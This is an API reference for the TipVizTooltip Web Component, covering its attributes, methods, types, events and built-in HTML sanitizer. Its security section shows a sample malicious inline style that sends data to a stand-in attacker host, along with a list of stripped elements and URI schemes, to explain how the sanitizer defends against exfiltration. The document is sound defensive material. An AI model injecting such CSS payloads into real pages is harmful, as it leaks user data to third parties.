# API Reference

This page documents the public API, attributes, types and usage examples for the `TipVizTooltip` Web Component.

---

## TipVizTooltip

### HTML Usage

```html
<tip-viz-tooltip id="tooltip" transition-duration="300" stylesheet="/tooltip.css"></tip-viz-tooltip>
```

#### Observed attributes

- `template` (string): optional; sets the tooltip HTML template with `[data-bind]` placeholders. Equivalent to calling `setTemplate()`.
- `data` (string): optional; JSON string of initial data. Equivalent to calling `setData()` but replaces the entire record on attribute update.
- `transition-duration` (number): optional; controls the fade duration for show/hide in milliseconds. Defaults to `200ms`.
- `stylesheet` (string): optional; URL to a stylesheet that will be added inside the component's shadow root.
- `no-auto-reposition` (boolean): optional; if present, the element will not be moved to `document.body` on connect. See [Automatic repositioning](#automatic-repositioning-to-documentbody) for details.

### Working with the component in JavaScript

When you select the component in JavaScript, you get access to its methods for setting content, styles, and controlling visibility.

```js
// tooltip is an instance of the custom element and exposes the methods below
const tooltip = document.getElementById('tooltip');
```

#### Methods

- **`loadStylesheet`**: Loads or updates a `<link rel="stylesheet">` inside the component shadow root using the provided `url`.

  ```ts
  loadStylesheet(url: string): void;
  ```

- **`setTemplate`**: Parses an HTML string and caches references to all elements with `[data-bind]` attributes for O(1) updates. The template is sanitized automatically before rendering.

    ```ts
    setTemplate(htmlString: string): void;
    ```

    ```html
    <!-- data-bind attributes act as placeholders for dynamic content -->
    <tip-viz-tooltip id="tooltip"></tip-viz-tooltip>
    <script>
      tooltip.setTemplate(`
        <div class="tooltip-content">
          <strong data-bind="label"></strong>
          <span data-bind="value"></span>
        </div>
      `);
    </script>
    ```

- **`setData`**: Merges the provided data into the internal store and updates every `[data-bind]` element whose key matches. If no template has been set yet, the data is stored and applied immediately when `setTemplate()` is called later. `setData()` performs a shallow merge into the existing data record — keys not present in the argument are preserved.

    ```ts
    setData(data: Record<string, string | number>): void;
    ```

    ```ts
    tooltip.setTemplate(`<span data-bind="name"></span>`);
    tooltip.setData({ name: "Alice", score: 42 });
    // <span data-bind="name"> becomes "Alice"
    // <span data-bind="score"> becomes "42"
    ```

    > [!Note] Missing keys in the template emit a `console.warn`. Call `setData()` and `show()` in any order — data is stored until a template is available.

> [!Note]
> Setting the `data` attribute (e.g. via `setAttribute("data", JSON.stringify(...))` or the HTML attribute itself) replaces the entire data record. This differs from `setData()`, which merges. After an attribute update, keys previously supplied only via `setData()` are dropped.

- **`setDirection`**: Sets the callback that determines the placement `Direction` for a given `data` and `target`.

  ```ts
  setDirection(fn: DirectionFn): void;
  ```

- **`setOffset`**: Sets the callback that returns an `Offset` pair applied to the computed coordinates. The offset is interpreted as `[x, y]` — where `x` (horizontal) is added to `left` and `y` (vertical) is added to `top`. Both are in pixels.

  ```ts
  setOffset(fn: OffsetCallback): void;
  ```

- **`setStyles`**: Applies scoped CSS to the component. Internally it uses the `CSSStyleSheet.replaceSync()` API with `adoptedStyleSheets`. If the browser does not support it, it falls back to injecting a `<style>` element inside the shadow root.

   ```ts
   setStyles(cssString: string): void;
   ```

- **`setSanitizerConfig`**: Overrides the built-in `SanitizerConfig` object that controls which elements and attributes are removed during template sanitization. The default config removes dangerous elements (`<script>`, `<iframe>`, etc.) and strips event handler attributes (`on*`, `srcdoc`, `formaction`).

   ```ts
   setSanitizerConfig(config: SanitizerConfig): void;
   ```

   ```ts
   // Allow <b> and <i> elements through
   tooltip.setSanitizerConfig({
     removeElements: ["script", "iframe"],
     removeAttributes: [/^on\S+$/i, "srcdoc", "formaction"]
   });
   ```

- **`show`**: Positions the tooltip relative to the `target` element and reveals it. Data must be provided beforehand via `setData()`. Default direction is `"n"` (above target); default offset is `[0, 0]`.

   ```ts
   show(target: Element): void;
   ```

- **`hide`**: Hides the tooltip and dispatches a bubbling, composed `hide` event.

  ```ts
  hide(): void;
  ```

#### External styling with `::part()`

The tooltip's inner `<div>` carries a `part="tooltip-box"` attribute:

```html
<tip-viz-tooltip id="tooltip"></tip-viz-tooltip>
```

This lets you style the tooltip from outside the shadow DOM via CSS `::part()`:

```css
tip-viz-tooltip::part(tooltip-box) {
  background: rgba(0, 0, 0, 0.9);
  color: white;
  padding: 8px;
  border-radius: 4px;
}
```

This approach does **not** require `setStyles()` and works independently of the internal CSS mechanism.

#### Automatic repositioning to `document.body`

The component **automatically moves itself to `document.body`** when connected. This ensures correct `window.scrollY`/`window.scrollX` positioning regardless of where you place the element in HTML — including inside framework root containers (`<div id="root">`), modals, or sidebar panels.

```html
<!-- This works correctly even inside a React root or Vue app container -->
<div id="root">
  <svg id="chart"></svg>
  <tip-viz-tooltip id="tooltip"></tip-viz-tooltip> <!-- will be moved to body -->
</div>
```

If you need to prevent this behavior, use the `no-auto-reposition` attribute:

```html
<tip-viz-tooltip id="tooltip" no-auto-reposition></tip-viz-tooltip>
```

> [!Note] The element is repositioned only once — on first connection. Moving it manually after that is not supported.

#### Lazy registration with `defineTooltip()`

The package auto-registers `<tip-viz-tooltip>` on import. For lazy/async scenarios, use `defineTooltip()` from the root export:

```ts
import { defineTooltip } from "tipviz";

// Registers only if not already defined — safe to call multiple times
await defineTooltip();
```

#### Events

- **`show`** — emitted when `show()` completes. `event.detail` contains:
  - `target`: the Element the tooltip was positioned against
  - `data`: the current data object (set via `setData()`)
  - `direction`: the resolved `Direction` string used for placement
  - `position`: `{ top, left }` numeric coordinates (before page scroll adjustments)

- **`hide`** — emitted when `hide()` is called.

Example:

```js
tooltip.addEventListener('show', (e) => console.log('shown', e.detail));
tooltip.addEventListener('hide', () => console.log('hidden'));
```

---

## Types

- **`Direction`**

```ts
type Direction = "n" | "s" | "e" | "w" | "nw" | "ne" | "sw" | "se";
```

Represents where the tooltip will be positioned relative to the target:

- `n` = above, `s` = below, `e` = right, `w` = left
- `nw`, `ne`, `sw`, `se` = corner placements

- **`Offset`**

```ts
type Offset = [number, number]; // [x, y] — x is horizontal (added to left), y is vertical (added to top)
```

An array of pixel offsets applied to the computed `top` and `left` coordinates. `x` shifts horizontally, `y` shifts vertically.

- **`SanitizerConfig`**

```ts
type SanitizerConfig = {
  removeElements: (string | RegExp)[];
  removeAttributes: (string | RegExp)[];
};
```

Controls which elements and attributes are stripped during template sanitization.

- **`OffsetCallback`**

```ts
type OffsetCallback = (...args: any[]) => Offset;
```

Callback that returns an `Offset` tuple.

- **`DirectionFn`**

```ts
type DirectionFn = (...args: any[]) => Direction;
```

Callback used by `setDirection` to determine the desired `Direction` given the `data` and `target`.

---

## Security

### HTML Sanitization

The `TipVizTooltip` component includes a built-in HTML sanitizer that runs automatically when content is passed to `show()`. The sanitizer:

- **Removes dangerous elements**: `<script>`, `<iframe>`, `<object>`, `<embed>`, `<link>`, `<meta>`, `<base>`, `<form>`, `<input>`, `<button>`, `<textarea>`, `<select>`
- **Strips event handler attributes**: Any attribute matching `on*` (e.g., `onclick`, `onerror`, `onload`), plus `srcdoc` and `formaction`
- **Blocks malicious URI schemes**: Removes `javascript:` and `vbscript:` URIs (including whitespace-obfuscated schemes like `java\tscript:`) and all non-image `data:` URIs
- **Strips `url()` from inline styles**: All CSS `url()` calls in `style` attributes are replaced with empty `url()` tokens to prevent CSS-based data exfiltration attacks

#### Example: CSS URL Injection Prevention

Without sanitization, this malicious HTML would trigger a network request:

```html
<div style="background: url(https://attacker.com/steal?data=SECRET)">tooltip</div>
```

After sanitization, it becomes:

```html
<div style="background: url()">tooltip</div>
```

No network request is made, and the browser silently ignores the invalid `url()`.

### Custom Sanitization

If you need different sanitization rules, pass a custom `SanitizerConfig` via `setSanitizerConfig()`:

```ts
// Allow <b> and <i> through but keep default attribute stripping
tooltip.setSanitizerConfig({
  removeElements: ["script", "iframe", "object", "embed"],
  removeAttributes: [/^on\S+$/i, "srcdoc", "formaction"]
});
```

### Untrusted Content Best Practices

When using `setTemplate()` with untrusted or user-supplied template strings:

1. The built-in sanitizer runs automatically on every `setTemplate()` call
2. Avoid interpolating sensitive data (tokens, API keys) into template strings
3. Use `data-bind` placeholders instead of string interpolation for dynamic content
4. Consider combining with a Content Security Policy (CSP) for defense-in-depth

---

## Example (complete)

```js
const tooltip = document.getElementById('tooltip');

// 1. Define the template with data-bind placeholders
tooltip.setTemplate(`
  <div class="tooltip-content">
    <strong data-bind="title"></strong>
    <div data-bind="value"></div>
  </div>
`);

// 2. Dynamic direction based on target position
tooltip.setDirection((data, target) => {
  const rect = target.getBoundingClientRect();
  return rect.top > 200 ? 'n' : 's';
});

// 3. Small offset so the tooltip doesn't sit directly on the target
tooltip.setOffset(() => [0, 6]);

// 4. Styles
tooltip.setStyles(`
  .tipviz-tooltip { background: rgba(0,0,0,0.8); color: white; padding: 6px; border-radius: 4px; }
`);

// 5. Show — data is set separately from the target
tooltip.setData({ title: 'Point A', value: 42 });
tooltip.show(document.querySelector('#point-a'));
// later
tooltip.hide();
```
